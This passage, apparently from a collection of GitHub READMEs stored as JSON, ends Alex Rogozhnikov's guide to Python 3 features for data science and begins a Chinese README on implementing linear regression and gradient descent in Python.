'\u60a8\u597d'\nprint(len(s))\nprint(s[:2])\n```\nOutput:\n- Python 2: `6\\n\ufffd\ufffd`\n- Python 3: `2\\n\u60a8\u597d`.\n\n```python\nx = u'\u0441\u043e'\nx += 'co' # ok\nx += '\u0441\u043e' # fail\n```\nPython 2 fails, Python 3 works as expected (because I've used russian letters in strings).\n\nIn Python 3 `str`s are unicode strings, and it is more convenient for NLP processing of non-english texts.\n\nThere are other funny things, for instance:\n```python\n'a' < type < u'a'  # Python 2: True\n'a' < u'a'         # Python 2: False\n```\n\n```python\nfrom collections import Counter\nCounter('M\u00f6belst\u00fcck')\n```\n\n- Python 2: `Counter({'\\xc3': 2, 'b': 1, 'e': 1, 'c': 1, 'k': 1, 'M': 1, 'l': 1, 's': 1, 't': 1, '\\xb6': 1, '\\xbc': 1})`\n- Python 3: `Counter({'M': 1, '\u00f6': 1, 'b': 1, 'e': 1, 'l': 1, 's': 1, 't': 1, '\u00fc': 1, 'c': 1, 'k': 1})`\n\nYou can handle all of this in Python 2 properly, but Python 3 is more friendly.\n\n## Preserving order of dictionaries and **kwargs\n\nIn CPython 3.6+ dicts behave like `OrderedDict` by default (and [this is guaranteed in Python 3.7+](https:\/\/stackoverflow.com\/questions\/39980323\/are-dictionaries-ordered-in-python-3-6)).\nThis preserves order during dict comprehensions (and other operations, e.g. during json serialization\/deserialization)\n\n```python\nimport json\nx = {str(i):i for i in range(5)}\njson.loads(json.dumps(x))\n# Python 2\n{u'1': 1, u'0': 0, u'3': 3, u'2': 2, u'4': 4}\n# Python 3\n{'0': 0, '1': 1, '2': 2, '3': 3, '4': 4}\n```\n\nSame applies to `**kwargs` (in Python 3.6+), they're kept in the same order as they appear in parameters.\nOrder is crucial when it comes to data pipelines, previously we had to write it in a cumbersome manner:\n```python\nfrom torch import nn\n\n# Python 2\nmodel = nn.Sequential(OrderedDict([\n          ('conv1', nn.Conv2d(1,20,5)),\n          ('relu1', nn.ReLU()),\n          ('conv2', nn.Conv2d(20,64,5)),\n          ('relu2', nn.ReLU())\n        ]))\n\n# Python 3.6+, how it *can* be done, not supported right now in pytorch\nmodel = nn.Sequential(\n    conv1=nn.Conv2d(1,20,5),\n    relu1=nn.ReLU(),\n    conv2=nn.Conv2d(20,64,5),\n    relu2=nn.ReLU())\n)\n```\n\nDid you notice? Uniqueness of names is also checked automatically.\n\n\n## Iterable unpacking\n\n```python\n# handy when amount of additional stored info may vary between experiments, but the same code can be used in all cases\nmodel_paramteres, optimizer_parameters, *other_params = load(checkpoint_name)\n\n# picking two last values from a sequence\n*prev, next_to_last, last = values_history\n\n# This also works with any iterables, so if you have a function that yields e.g. qualities,\n# below is a simple way to take only last two values from a list\n*prev, next_to_last, last = iter_train(args)\n```\n\n## Default pickle engine provides better compression for arrays\n\nPickling is a mechanism to pass data between threads \/ processes, in particular used inside `multiprocessing` package. \n\n```python\n# Python 2\nimport cPickle as pickle\nimport numpy\nprint len(pickle.dumps(numpy.random.normal(size=[1000, 1000])))\n# result: 23691675\n\n# Python 3\nimport pickle\nimport numpy\nlen(pickle.dumps(numpy.random.normal(size=[1000, 1000])))\n# result: 8000162\n```\n\nThree times less space. And it is *much* faster.\nActually similar compression (but not speed) is achievable with `protocol=2` parameter, but developers typically ignore this option (or simply are not aware of it). \n\nNote: pickle is [not safe](https:\/\/docs.python.org\/3\/library\/pickle.html) (and not quite transferrable), so never unpickle data received from an untrusted or unauthenticated source.\n\n## Safer comprehensions\n\n```python\nlabels = <initial_value>\npredictions = [model.predict(data) for data, labels in dataset]\n\n# labels are overwritten in Python 2\n# labels are not affected by comprehension in Python 3\n```\n\n## Super, simply super()\n\nPython 2 `super(...)` was a frequent source of mistakes in code.\n\n```python\n# Python 2\nclass MySubClass(MySuperClass):\n    def __init__(self, name, **options):\n        super(MySubClass, self).__init__(name='subclass', **options)\n\n# Python 3\nclass MySubClass(MySuperClass):\n    def __init__(self, name, **options):\n        super().__init__(name='subclass', **options)\n```\n\nMore on `super` and method resolution order on [stackoverflow](https:\/\/stackoverflow.com\/questions\/576169\/understanding-python-super-with-init-methods).\n\n## Better IDE suggestions with variable annotations\n\nThe most enjoyable thing about programming in languages like Java, C# and alike is that IDE can make very good suggestions,\nbecause type of each identifier is known before executing a program.\n\nIn python this is hard to achieve, but annotations will help you\n- write your expectations in a clear form\n- and get good suggestions from IDE\n\n<img src='images\/variable_annotations.png' \/><br \/>\nThis is an example of PyCharm suggestions with variable annotations.\nThis works even in situations when functions you use are not annotated (e.g. due to backward compatibility).\n\n## Multiple unpacking\n\nHere is how you merge two dicts now:\n```python\nx = dict(a=1, b=2)\ny = dict(b=3, d=4)\n# Python 3.5+\nz = {**x, **y}\n# z = {'a': 1, 'b': 3, 'd': 4}, note that value for `b` is taken from the latter dict.\n```\n\nSee [this thread at StackOverflow](https:\/\/stackoverflow.com\/questions\/38987\/how-to-merge-two-dictionaries-in-a-single-expression) for a comparison with Python 2.\n\nThe same approach also works for lists, tuples, and sets (`a`, `b`, `c` are any iterables):\n```python\n[*a, *b, *c] # list, concatenating\n(*a, *b, *c) # tuple, concatenating\n{*a, *b, *c} # set, union\n```\n\nFunctions also [support multiple unpacking](https:\/\/docs.python.org\/3\/whatsnew\/3.5.html#whatsnew-pep-448) for `*args` and `**kwargs`:\n```python\n# Python 3.5+\ndo_something(**{**default_settings, **custom_settings})\n\n# Also possible, this code also checks there is no intersection between keys of dictionaries\ndo_something(**first_args, **second_args)\n```\n\n## Future-proof APIs with keyword-only arguments\n\nLet's consider this snippet\n```python\nmodel = sklearn.svm.SVC(2, 'poly', 2, 4, 0.5)\n```\nObviously, an author of this code didn't get the Python style of coding yet (most probably, just jumped from cpp or rust).\nUnfortunately, this is not just question of taste, because changing the order of arguments (adding\/deleting) in `SVC` will break this code. In particular, `sklearn` does some reordering\/renaming from time to time of numerous algorithm parameters to provide consistent API. Each such refactoring may drive to broken code.\n\nIn Python 3, library authors may demand explicitly named parameters by using `*`:\n```python\nclass SVC(BaseSVC):\n    def __init__(self, *, C=1.0, kernel='rbf', degree=3, gamma='auto', coef0=0.0, ... )\n```\n- users have to specify names of parameters `sklearn.svm.SVC(C=2, kernel='poly', degree=2, gamma=4, coef0=0.5)` now\n- this mechanism provides a great combination of reliability and flexibility of APIs\n\n## Data classes\n\nPython 3.7 introduces data classes, a good replacement for `namedtuple` in most cases.\n```python\n@dataclass\nclass Person:\n    name: str\n    age: int\n\n@dataclass\nclass Coder(Person):\n    preferred_language: str = 'Python 3'\n```\n\n`dataclass` decorator takes the job of implementing routine methods for you (initialization, representation, comparison, and hashing when applicable). \nLet's name some features:\n- data classes can be both mutable and immutable\n- default values for fields are supported\n- inheritance\n- data classes are still old good classes: you can define new methods and override existing\n- post-init processing (e.g. to verify consistency) \n\nGeir Arne Hjelle gives a good overview of dataclasses [in his post](https:\/\/realpython.com\/python-data-classes\/).\n\n\n\n\n## Customizing access to module attributes\n\nIn Python you can control attribute access and hinting with `__getattr__` and `__dir__` for any object. Since python 3.7 you can do it for modules too.\n\nA natural example is implementing a `random` submodule of tensor libraries, which is typically a shortcut to skip initialization and passing of RandomState objects. Here's implementation for numpy:  \n```python\n# nprandom.py\nimport numpy\n__random_state = numpy.random.RandomState()\n\ndef __getattr__(name):\n    return getattr(__random_state, name)\n\ndef __dir__():\n    return dir(__random_state)\n    \ndef seed(seed):\n    __random_state = numpy.random.RandomState(seed=seed)\n```\n\nOne can also mix this way functionalities of different objects\/submodules. Compare with tricks in [pytorch](https:\/\/github.com\/pytorch\/pytorch\/blob\/3ce17bf8f6a2c4239085191ea60d6ee51cd620a5\/torch\/__init__.py#L253-L256) and [cupy](https:\/\/github.com\/cupy\/cupy\/blob\/94592ecac8152d5f4a56a129325cc91d184480ad\/cupy\/random\/distributions.py).\n\nAdditionally, now one can\n- use it for [lazy loading of submodules](https:\/\/snarky.ca\/lazy-importing-in-python-3-7\/). For example, `import tensorflow` takes **~150MB** of RAM is imports all submodules (and dependencies). \n- use this for [deprecations in API](https:\/\/www.python.org\/dev\/peps\/pep-0562\/)\n- introduce runtime routing between submodules\n\n## Built-in breakpoint()\n\nJust write `breakpoint()` in the code to invoke debugger.\n```python\n# Python 3.7+, not all IDEs support this at the moment\nfoo()\nbreakpoint()\nbar()\n```\n\nFor remote debugging you may want to try [combining breakpoint() with `web-pdb`](https:\/\/hackernoon.com\/python-3-7s-new-builtin-breakpoint-a-quick-tour-4f1aebc444c)\n\n\n## Minor: constants in `math` module\n\n```python\n# Python 3\nmath.inf # Infinite float\nmath.nan # not a number\n\nmax_quality = -math.inf  # no more magic initial values!\n\nfor model in trained_models:\n    max_quality = max(max_quality, compute_quality(model, data))\n```\n\n## Minor: single integer type\n\nPython 2 provides two basic integer types, which are `int` (64-bit signed integer) and `long` for long arithmetics (quite confusing after C++).\n\nPython 3 has a single type `int`, which incorporates long arithmetics.\n\nHere is how you check that value is integer:\n\n```python\nisinstance(x, numbers.Integral) # Python 2, the canonical way\nisinstance(x, (long, int))      # Python 2\nisinstance(x, int)              # Python 3, easier to remember\n```\n\nUpdate: first check also works for *other integral types*, such as `numpy.int32`, `numpy.int64`, but others don't. So they're not equivalent.\n\n\n## Other stuff\n\n- `Enum`s are theoretically useful, but\n    - string-typing is already widely adopted in the python data stack\n    - `Enum`s don't seem to interplay with numpy and categorical from pandas\n- coroutines also *sound* very promising for data pipelining (see [slides](http:\/\/www.dabeaz.com\/coroutines\/Coroutines.pdf) by David Beazley), but I don't see their adoption in the wild.\n- Python 3 has [stable ABI](https:\/\/www.python.org\/dev\/peps\/pep-0384\/)\n- Python 3 supports unicode identifies (so `\u03c9 = \u0394\u03c6 \/ \u0394t` is ok), but you'd [better use good old ASCII names](https:\/\/stackoverflow.com\/a\/29855176\/498892)\n- some libraries e.g. [jupyterhub](https:\/\/github.com\/jupyterhub\/jupyterhub) (jupyter in cloud), django and fresh ipython only support Python 3, so features that sound useless for you are useful for libraries you'll probably want to use once.\n\n\n### Problems for code migration specific for data science (and how to resolve those)\n\n- support for nested arguments [was dropped](https:\/\/www.python.org\/dev\/peps\/pep-3113\/)\n  ```python\n  map(lambda x, (y, z): x, z, dict.items())\n  ```\n\n  However, it is still perfectly working with different comprehensions:\n  ```python\n  {x:z for x, (y, z) in d.items()}\n  ```\n  In general, comprehensions are also better 'translatable' between Python 2 and 3.\n\n- `map()`, `.keys()`, `.values()`, `.items()`, etc. return iterators, not lists. Main problems with iterators are:\n  - no trivial slicing\n  - can't be iterated twice\n\n  Almost all of the problems are resolved by converting result to list.\n\n- see [Python FAQ: How do I port to Python 3?](https:\/\/eev.ee\/blog\/2016\/07\/31\/python-faq-how-do-i-port-to-python-3\/) when in trouble\n\n### Main problems for teaching machine learning and data science with python\n\nCourse authors should spend time in the first lectures to explain what is an iterator,\nwhy it can't be sliced \/ concatenated \/ multiplied \/ iterated twice like a string (and how to deal with it).\n\nI think most course authors would be happy to avoid these details, but now it is hardly possible.\n\n# Conclusion\n\nPython 2 and Python 3 have co-existed for almost 10 years, but we *should* move to Python 3.\n\nResearch and production code should become a bit shorter, more readable, and significantly safer after moving to Python 3-only codebase.\n\nRight now most libraries support both Python versions.\nAnd I can't wait for the bright moment when packages drop support for Python 2 and enjoy new language features.\n\nFollowing migrations are promised to be smoother: [\"we will never do this kind of backwards-incompatible change again\"](https:\/\/snarky.ca\/why-python-3-exists\/)\n\n### Links\n\n- [Key differences between Python 2.7 and Python 3.x](http:\/\/sebastianraschka.com\/Articles\/2014_python_2_3_key_diff.html)\n- [Python FAQ: How do I port to Python 3?](https:\/\/eev.ee\/blog\/2016\/07\/31\/python-faq-how-do-i-port-to-python-3\/)\n- [10 awesome features of Python that you can't use because you refuse to upgrade to Python 3](http:\/\/www.asmeurer.com\/python3-presentation\/slides.html)\n- [Trust me, python 3.3 is better than 2.7 (video)](http:\/\/pyvideo.org\/pycon-us-2013\/python-33-trust-me-its-better-than-27.html)\n- [Python 3 for scientists](http:\/\/python-3-for-scientists.readthedocs.io\/en\/latest\/)\n\n### License\n\nThis text was published by [Alex Rogozhnikov](https:\/\/arogozhnikov.github.io\/about\/) and [contributors](https:\/\/github.com\/arogozhnikov\/python3_with_pleasure\/graphs\/contributors) under [CC BY-SA 3.0 License](https:\/\/creativecommons.org\/licenses\/by-sa\/3.0\/) (excluding images).\n"},{"repo":"\/lawlite19\/MachineLearning_Python","language":"Python","readme_contents":"\u673a\u5668\u5b66\u4e60\u7b97\u6cd5Python\u5b9e\u73b0\n=========\n\n[![MIT license](https:\/\/img.shields.io\/dub\/l\/vibe-d.svg)](https:\/\/github.com\/lawlite19\/MachineLearning_Python\/blob\/master\/LICENSE)\n\n## \u76ee\u5f55\n* [\u673a\u5668\u5b66\u4e60\u7b97\u6cd5Python\u5b9e\u73b0](#\u673a\u5668\u5b66\u4e60\u7b97\u6cd5python\u5b9e\u73b0)\n\t* [\u4e00\u3001\u7ebf\u6027\u56de\u5f52](#\u4e00\u7ebf\u6027\u56de\u5f52)\n\t\t* [1\u3001\u4ee3\u4ef7\u51fd\u6570](#1\u4ee3\u4ef7\u51fd\u6570)\n\t\t* [2\u3001\u68af\u5ea6\u4e0b\u964d\u7b97\u6cd5](#2\u68af\u5ea6\u4e0b\u964d\u7b97\u6cd5)\n\t\t* [3\u3001\u5747\u503c\u5f52\u4e00\u5316](#3\u5747\u503c\u5f52\u4e00\u5316)\n\t\t* [4\u3001\u6700\u7ec8\u8fd0\u884c\u7ed3\u679c](#4\u6700\u7ec8\u8fd0\u884c\u7ed3\u679c)\n\t\t* [5\u3001\u4f7f\u7528scikit-learn\u5e93\u4e2d\u7684\u7ebf\u6027\u6a21\u578b\u5b9e\u73b0](#5\u4f7f\u7528scikit-learn\u5e93\u4e2d\u7684\u7ebf\u6027\u6a21\u578b\u5b9e\u73b0)\n\t* [\u4e8c\u3001\u903b\u8f91\u56de\u5f52](#\u4e8c\u903b\u8f91\u56de\u5f52)\n\t\t* [1\u3001\u4ee3\u4ef7\u51fd\u6570](#1\u4ee3\u4ef7\u51fd\u6570)\n\t\t* [2\u3001\u68af\u5ea6](#2\u68af\u5ea6)\n\t\t* [3\u3001\u6b63\u5219\u5316](#3\u6b63\u5219\u5316)\n\t\t* [4\u3001S\u578b\u51fd\u6570\uff08\u5373\uff09](#4s\u578b\u51fd\u6570\u5373)\n\t\t* [5\u3001\u6620\u5c04\u4e3a\u591a\u9879\u5f0f](#5\u6620\u5c04\u4e3a\u591a\u9879\u5f0f)\n\t\t* [6\u3001\u4f7f\u7528\u7684\u4f18\u5316\u65b9\u6cd5](#6\u4f7f\u7528scipy\u7684\u4f18\u5316\u65b9\u6cd5)\n\t\t* [7\u3001\u8fd0\u884c\u7ed3\u679c](#7\u8fd0\u884c\u7ed3\u679c)\n\t\t* [8\u3001\u4f7f\u7528scikit-learn\u5e93\u4e2d\u7684\u903b\u8f91\u56de\u5f52\u6a21\u578b\u5b9e\u73b0](#8\u4f7f\u7528scikit-learn\u5e93\u4e2d\u7684\u903b\u8f91\u56de\u5f52\u6a21\u578b\u5b9e\u73b0)\n\t* [\u903b\u8f91\u56de\u5f52_\u624b\u5199\u6570\u5b57\u8bc6\u522b_OneVsAll](#\u903b\u8f91\u56de\u5f52_\u624b\u5199\u6570\u5b57\u8bc6\u522b_onevsall)\n\t\t* [1\u3001\u968f\u673a\u663e\u793a100\u4e2a\u6570\u5b57](#1\u968f\u673a\u663e\u793a100\u4e2a\u6570\u5b57)\n\t\t* [2\u3001OneVsAll](#2onevsall)\n\t\t* [3\u3001\u624b\u5199\u6570\u5b57\u8bc6\u522b](#3\u624b\u5199\u6570\u5b57\u8bc6\u522b)\n\t\t* [4\u3001\u9884\u6d4b](#4\u9884\u6d4b)\n\t\t* [5\u3001\u8fd0\u884c\u7ed3\u679c](#5\u8fd0\u884c\u7ed3\u679c)\n\t\t* [6\u3001\u4f7f\u7528scikit-learn\u5e93\u4e2d\u7684\u903b\u8f91\u56de\u5f52\u6a21\u578b\u5b9e\u73b0](#6\u4f7f\u7528scikit-learn\u5e93\u4e2d\u7684\u903b\u8f91\u56de\u5f52\u6a21\u578b\u5b9e\u73b0)\n\t* [\u4e09\u3001BP\u795e\u7ecf\u7f51\u7edc](#\u4e09bp\u795e\u7ecf\u7f51\u7edc)\n\t\t* [1\u3001\u795e\u7ecf\u7f51\u7edcmodel](#1\u795e\u7ecf\u7f51\u7edcmodel)\n\t\t* [2\u3001\u4ee3\u4ef7\u51fd\u6570](#2\u4ee3\u4ef7\u51fd\u6570)\n\t\t* [3\u3001\u6b63\u5219\u5316](#3\u6b63\u5219\u5316)\n\t\t* [4\u3001\u53cd\u5411\u4f20\u64adBP](#4\u53cd\u5411\u4f20\u64adbp)\n\t\t* [5\u3001BP\u53ef\u4ee5\u6c42\u68af\u5ea6\u7684\u539f\u56e0](#5bp\u53ef\u4ee5\u6c42\u68af\u5ea6\u7684\u539f\u56e0)\n\t\t* [6\u3001\u68af\u5ea6\u68c0\u67e5](#6\u68af\u5ea6\u68c0\u67e5)\n\t\t* [7\u3001\u6743\u91cd\u7684\u968f\u673a\u521d\u59cb\u5316](#7\u6743\u91cd\u7684\u968f\u673a\u521d\u59cb\u5316)\n\t\t* [8\u3001\u9884\u6d4b](#8\u9884\u6d4b)\n\t\t* [9\u3001\u8f93\u51fa\u7ed3\u679c](#9\u8f93\u51fa\u7ed3\u679c)\n\t* [\u56db\u3001SVM\u652f\u6301\u5411\u91cf\u673a](#\u56dbsvm\u652f\u6301\u5411\u91cf\u673a)\n\t\t* [1\u3001\u4ee3\u4ef7\u51fd\u6570](#1\u4ee3\u4ef7\u51fd\u6570)\n\t\t* [2\u3001Large Margin](#2large-margin)\n\t\t* [3\u3001SVM Kernel\uff08\u6838\u51fd\u6570\uff09](#3svm-kernel\u6838\u51fd\u6570)\n\t\t* [4\u3001\u4f7f\u7528\u4e2d\u7684\u6a21\u578b\u4ee3\u7801](#4\u4f7f\u7528scikit-learn\u4e2d\u7684svm\u6a21\u578b\u4ee3\u7801)\n\t\t* [5\u3001\u8fd0\u884c\u7ed3\u679c](#5\u8fd0\u884c\u7ed3\u679c)\n\t* [\u4e94\u3001K-Means\u805a\u7c7b\u7b97\u6cd5](#\u4e94k-means\u805a\u7c7b\u7b97\u6cd5)\n\t\t* [1\u3001\u805a\u7c7b\u8fc7\u7a0b](#1\u805a\u7c7b\u8fc7\u7a0b)\n\t\t* [2\u3001\u76ee\u6807\u51fd\u6570](#2\u76ee\u6807\u51fd\u6570)\n\t\t* [3\u3001\u805a\u7c7b\u4e2d\u5fc3\u7684\u9009\u62e9](#3\u805a\u7c7b\u4e2d\u5fc3\u7684\u9009\u62e9)\n\t\t* [4\u3001\u805a\u7c7b\u4e2a\u6570K\u7684\u9009\u62e9](#4\u805a\u7c7b\u4e2a\u6570k\u7684\u9009\u62e9)\n\t\t* [5\u3001\u5e94\u7528\u2014\u2014\u56fe\u7247\u538b\u7f29](#5\u5e94\u7528\u56fe\u7247\u538b\u7f29)\n\t\t* [6\u3001\u4f7f\u7528scikit-learn\u5e93\u4e2d\u7684\u7ebf\u6027\u6a21\u578b\u5b9e\u73b0\u805a\u7c7b](#6\u4f7f\u7528scikit-learn\u5e93\u4e2d\u7684\u7ebf\u6027\u6a21\u578b\u5b9e\u73b0\u805a\u7c7b)\n\t\t* [7\u3001\u8fd0\u884c\u7ed3\u679c](#7\u8fd0\u884c\u7ed3\u679c)\n\t* [\u516d\u3001PCA\u4e3b\u6210\u5206\u5206\u6790\uff08\u964d\u7ef4\uff09](#\u516dpca\u4e3b\u6210\u5206\u5206\u6790\u964d\u7ef4)\n\t\t* [1\u3001\u7528\u5904](#1\u7528\u5904)\n\t\t* [2\u30012D-->1D\uff0cnD-->kD](#22d--1dnd--kd)\n\t\t* [3\u3001\u4e3b\u6210\u5206\u5206\u6790PCA\u4e0e\u7ebf\u6027\u56de\u5f52\u7684\u533a\u522b](#3\u4e3b\u6210\u5206\u5206\u6790pca\u4e0e\u7ebf\u6027\u56de\u5f52\u7684\u533a\u522b)\n\t\t* [4\u3001PCA\u964d\u7ef4\u8fc7\u7a0b](#4pca\u964d\u7ef4\u8fc7\u7a0b)\n\t\t* [5\u3001\u6570\u636e\u6062\u590d](#5\u6570\u636e\u6062\u590d)\n\t\t* [6\u3001\u4e3b\u6210\u5206\u4e2a\u6570\u7684\u9009\u62e9\uff08\u5373\u8981\u964d\u7684\u7ef4\u5ea6\uff09](#6\u4e3b\u6210\u5206\u4e2a\u6570\u7684\u9009\u62e9\u5373\u8981\u964d\u7684\u7ef4\u5ea6)\n\t\t* [7\u3001\u4f7f\u7528\u5efa\u8bae](#7\u4f7f\u7528\u5efa\u8bae)\n\t\t* [8\u3001\u8fd0\u884c\u7ed3\u679c](#8\u8fd0\u884c\u7ed3\u679c)\n\t\t* [9\u3001\u4f7f\u7528scikit-learn\u5e93\u4e2d\u7684PCA\u5b9e\u73b0\u964d\u7ef4](#9\u4f7f\u7528scikit-learn\u5e93\u4e2d\u7684pca\u5b9e\u73b0\u964d\u7ef4)\n\t* [\u4e03\u3001\u5f02\u5e38\u68c0\u6d4b Anomaly Detection](#\u4e03\u5f02\u5e38\u68c0\u6d4b-anomaly-detection)\n\t\t* [1\u3001\u9ad8\u65af\u5206\u5e03\uff08\u6b63\u6001\u5206\u5e03\uff09](#1\u9ad8\u65af\u5206\u5e03\u6b63\u6001\u5206\u5e03gaussian-distribution)\n\t\t* [2\u3001\u5f02\u5e38\u68c0\u6d4b\u7b97\u6cd5](#2\u5f02\u5e38\u68c0\u6d4b\u7b97\u6cd5)\n\t\t* [3\u3001\u8bc4\u4ef7\u7684\u597d\u574f\uff0c\u4ee5\u53ca\u7684\u9009\u53d6](#3\u8bc4\u4ef7px\u7684\u597d\u574f\u4ee5\u53ca\u03b5\u7684\u9009\u53d6)\n\t\t* [4\u3001\u9009\u62e9\u4f7f\u7528\u4ec0\u4e48\u6837\u7684feature\uff08\u5355\u5143\u9ad8\u65af\u5206\u5e03\uff09](#4\u9009\u62e9\u4f7f\u7528\u4ec0\u4e48\u6837\u7684feature\u5355\u5143\u9ad8\u65af\u5206\u5e03)\n\t\t* [5\u3001\u591a\u5143\u9ad8\u65af\u5206\u5e03](#5\u591a\u5143\u9ad8\u65af\u5206\u5e03)\n\t\t* [6\u3001\u5355\u5143\u548c\u591a\u5143\u9ad8\u65af\u5206\u5e03\u7279\u70b9](#6\u5355\u5143\u548c\u591a\u5143\u9ad8\u65af\u5206\u5e03\u7279\u70b9)\n\t\t* [7\u3001\u7a0b\u5e8f\u8fd0\u884c\u7ed3\u679c](#7\u7a0b\u5e8f\u8fd0\u884c\u7ed3\u679c)\n\n## \u4e00\u3001[\u7ebf\u6027\u56de\u5f52](\/LinearRegression)\n- [\u5168\u90e8\u4ee3\u7801](\/LinearRegression\/LinearRegression.py)\n\n### 1\u3001\u4ee3\u4ef7\u51fd\u6570\n- ![J(\\theta ) = \\frac{1}{{2{\\text{m}}}}\\sum\\limits_{i = 1}^m {{{({h_\\theta }({x^{(i)}}) - {y^{(i)}})}^2}} ](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=J%28%5Ctheta%20%29%20%3D%20%5Cfrac%7B1%7D%7B%7B2%7B%5Ctext%7Bm%7D%7D%7D%7D%5Csum%5Climits_%7Bi%20%3D%201%7D%5Em%20%7B%7B%7B%28%7Bh_%5Ctheta%20%7D%28%7Bx%5E%7B%28i%29%7D%7D%29%20-%20%7By%5E%7B%28i%29%7D%7D%29%7D%5E2%7D%7D%20)\n- \u5176\u4e2d\uff1a\n![{h_\\theta }(x) = {\\theta _0} + {\\theta _1}{x_1} + {\\theta _2}{x_2} + ...](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7Bh_%5Ctheta%20%7D%28x%29%20%3D%20%7B%5Ctheta%20_0%7D%20%2B%20%7B%5Ctheta%20_1%7D%7Bx_1%7D%20%2B%20%7B%5Ctheta%20_2%7D%7Bx_2%7D%20%2B%20...)\n\n- \u4e0b\u9762\u5c31\u662f\u8981\u6c42\u51fatheta\uff0c\u4f7f\u4ee3\u4ef7\u6700\u5c0f\uff0c\u5373\u4ee3\u8868\u6211\u4eec\u62df\u5408\u51fa\u6765\u7684\u65b9\u7a0b\u8ddd\u79bb\u771f\u5b9e\u503c\u6700\u8fd1\n- \u5171\u6709m\u6761\u6570\u636e\uff0c\u5176\u4e2d![{{{({h_\\theta }({x^{(i)}}) - {y^{(i)}})}^2}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7B%7B%7B%28%7Bh_%5Ctheta%20%7D%28%7Bx%5E%7B%28i%29%7D%7D%29%20-%20%7By%5E%7B%28i%29%7D%7D%29%7D%5E2%7D%7D)\u4ee3\u8868\u6211\u4eec\u8981\u62df\u5408\u51fa\u6765\u7684\u65b9\u7a0b\u5230\u771f\u5b9e\u503c\u8ddd\u79bb\u7684\u5e73\u65b9\uff0c\u5e73\u65b9\u7684\u539f\u56e0\u662f\u56e0\u4e3a\u53ef\u80fd\u6709\u8d1f\u503c\uff0c\u6b63\u8d1f\u53ef\u80fd\u4f1a\u62b5\u6d88\n- \u524d\u9762\u6709\u7cfb\u6570`2`\u7684\u539f\u56e0\u662f\u4e0b\u9762\u6c42\u68af\u5ea6\u662f\u5bf9\u6bcf\u4e2a\u53d8\u91cf\u6c42\u504f\u5bfc\uff0c`2`\u53ef\u4ee5\u6d88\u53bb\n\n- \u5b9e\u73b0\u4ee3\u7801\uff1a\n```\n# \u8ba1\u7b97\u4ee3\u4ef7\u51fd\u6570\ndef computerCost(X,y,theta):\n    m = len(y)\n    J = 0\n    \n    J = (np.transpose(X*theta-y))*(X*theta-y)\/(2*m) #\u8ba1\u7b97\u4ee3\u4ef7J\n    return J\n```\n - \u6ce8\u610f\u8fd9\u91cc\u7684X\u662f\u771f\u5b9e\u6570\u636e\u524d\u52a0\u4e86\u4e00\u52171\uff0c\u56e0\u4e3a\u6709theta(0)\n\n### 2\u3001\u68af\u5ea6\u4e0b\u964d\u7b97\u6cd5\n- \u4ee3\u4ef7\u51fd\u6570\u5bf9![{{\\theta _j}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7B%7B%5Ctheta%20_j%7D%7D)\u6c42\u504f\u5bfc\u5f97\u5230\uff1a   \n![\\frac{{\\partial J(\\theta )}}{{\\partial {\\theta _j}}} = \\frac{1}{m}\\sum\\limits_{i = 1}^m {[({h_\\theta }({x^{(i)}}) - {y^{(i)}})x_j^{(i)}]} ](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%5Cfrac%7B%7B%5Cpartial%20J%28%5Ctheta%20%29%7D%7D%7B%7B%5Cpartial%20%7B%5Ctheta%20_j%7D%7D%7D%20%3D%20%5Cfrac%7B1%7D%7Bm%7D%5Csum%5Climits_%7Bi%20%3D%201%7D%5Em%20%7B%5B%28%7Bh_%5Ctheta%20%7D%28%7Bx%5E%7B%28i%29%7D%7D%29%20-%20%7By%5E%7B%28i%29%7D%7D%29x_j%5E%7B%28i%29%7D%5D%7D%20)\n- \u6240\u4ee5\u5bf9theta\u7684\u66f4\u65b0\u53ef\u4ee5\u5199\u4e3a\uff1a   \n![{\\theta _j} = {\\theta _j} - \\alpha \\frac{1}{m}\\sum\\limits_{i = 1}^m {[({h_\\theta }({x^{(i)}}) - {y^{(i)}})x_j^{(i)}]} ](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7B%5Ctheta%20_j%7D%20%3D%20%7B%5Ctheta%20_j%7D%20-%20%5Calpha%20%5Cfrac%7B1%7D%7Bm%7D%5Csum%5Climits_%7Bi%20%3D%201%7D%5Em%20%7B%5B%28%7Bh_%5Ctheta%20%7D%28%7Bx%5E%7B%28i%29%7D%7D%29%20-%20%7By%5E%7B%28i%29%7D%7D%29x_j%5E%7B%28i%29%7D%5D%7D%20)\n- \u5176\u4e2d![\\alpha ](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%5Calpha%20)\u4e3a\u5b66\u4e60\u901f\u7387\uff0c\u63a7\u5236\u68af\u5ea6\u4e0b\u964d\u7684\u901f\u5ea6\uff0c\u4e00\u822c\u53d6**0.01,0.03,0.1,0.3.....**\n- \u4e3a\u4ec0\u4e48\u68af\u5ea6\u4e0b\u964d\u53ef\u4ee5\u9010\u6b65\u51cf\u5c0f\u4ee3\u4ef7\u51fd\u6570\n - \u5047\u8bbe\u51fd\u6570`f(x)`\n - \u6cf0\u52d2\u5c55\u5f00\uff1a`f(x+\u25b3x)=f(x)+f'(x)*\u25b3x+o(\u25b3x)`\n - \u4ee4\uff1a`\u25b3x=-\u03b1*f'(x)`   ,\u5373\u8d1f\u68af\u5ea6\u65b9\u5411\u4e58\u4ee5\u4e00\u4e2a\u5f88\u5c0f\u7684\u6b65\u957f`\u03b1`\n - \u5c06`\u25b3x`\u4ee3\u5165\u6cf0\u52d2\u5c55\u5f00\u5f0f\u4e2d\uff1a`f(x+\u25b3x)=f(x)-\u03b1*[f'(x)]\u00b2+o(\u25b3x)`\n - 